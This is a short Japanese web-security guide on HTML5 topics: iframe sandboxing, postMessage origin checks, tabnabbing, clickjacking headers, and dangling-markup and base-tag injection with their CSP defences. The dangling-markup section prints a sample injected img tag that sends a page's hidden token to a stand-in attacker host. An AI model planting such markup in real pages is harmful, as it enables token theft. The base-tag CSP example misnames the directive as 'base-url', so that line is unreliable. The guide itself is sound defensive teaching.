---
title: HTML5 Security
---

## iframeのsandbox化

iframeで信頼できないコンテンツを表示する場合、sandbox属性を付与することで、iframe内の制御に様々な制約を適用できる。各種制御それぞれに制約有無を指定することも可能。

sandbox化されたiframeはユニークなオリジンが割り振られる。それにより、コンテキストが分離されるため、安全性が増す。

詳細は[Mozilla](https://developer.mozilla.org/ja/docs/Web/HTML/Element/iframe#attr-sandbox)を参照。

## オリジン間通信

異なるオリジン間で通信をする際、[postMessage](https://developer.mozilla.org/ja/docs/Web/API/Window/postMessage)で実現可能。

ただし、次のとおりいくつかの注意事項がある。

### postMessageの送信先（第二引数）は可能な限り指定する

送信先を指定することにより、情報を受け取るターゲットを絞ることができる。

:::danger
`*`の指定ですべてのオリジンをターゲットにできるが、その場合は機密情報を含めるべきではない。
:::

### 受信側は送信元をチェックした上で処理する

イベントリスナに渡される`event.origin`で送信元をチェックする。

```js
window.addEventListener("message", (event) => {
  if (event.origin === "https://example.com") {
    // 処理
  }
});
```

## タブナビング攻撃

タブナビング攻撃については[こちら](https://en.wikipedia.org/wiki/Tabnabbing)を参照。

リンクを別タブで開いたり、ポップアップウィンドウを表示した場合、開かれたコンテンツ側で`window.opener`プロパティを参照すると、タブナビング攻撃を仕掛けることが可能。

対処としては、`rel="noopener"`属性をアンカータグに追加する。

```html
<a href="https://example.com" target="_blank" rel="noopener">LINK</a>
```

## クリックジャッキング攻撃やUIリドレス攻撃への対処

クリックジャッキング攻撃については[こちら](https://www.ipa.go.jp/security/vuln/websecurity-HTML-1_9.html)を参照。

対処としては、iframeによる組込みを制限すること。その手段として、次の2つが挙げられる。

- X-Frame-Optionsヘッダー
- Content-Security-Policyヘッダーのframe-ancestorsディレクティブ

## Dangling markup injection

攻撃者に次のような不正なHTMLタグをページに挿入されることで、トークンなどを盗まれてしまう。

```html
<img src="https://evil.com/log.php?
```

上記はimgタグおよび、src属性を閉じていない。そのため、ブラウザのパーサーは適切な終了シーケンスを探す。
もし次のように、inputタグ（hidden属性）でトークンなどの重要な情報を指定していたら、`https://evil.com/log.php`に送信されてしまう。

```html
<img src="https://evil.com/log.php?
・・・
<input type="hidden" name="token" value="xxxx-yyyy" />
```

対処としては、次の2点。

- 適切にエンコードし、HTMLインジェクション自体を防ぐ
- CSPを使って、攻撃者のサーバーからのリソースロードを防ぐ

  ```text
  Content-Security-Policy: img-src 'self'
  ```

## Base tag injection

攻撃者にbaseタグを挿入されると、すべての相対URLが攻撃者のサーバーを指すようになってしまう。

対処としては、次の2点。

- 適切にエンコードし、HTMLインジェクション自体を防ぐ
- CSPを使って、有効なベースURLを限定しておく

  ```text
  Content-Security-Policy: base-url 'self'
  ```
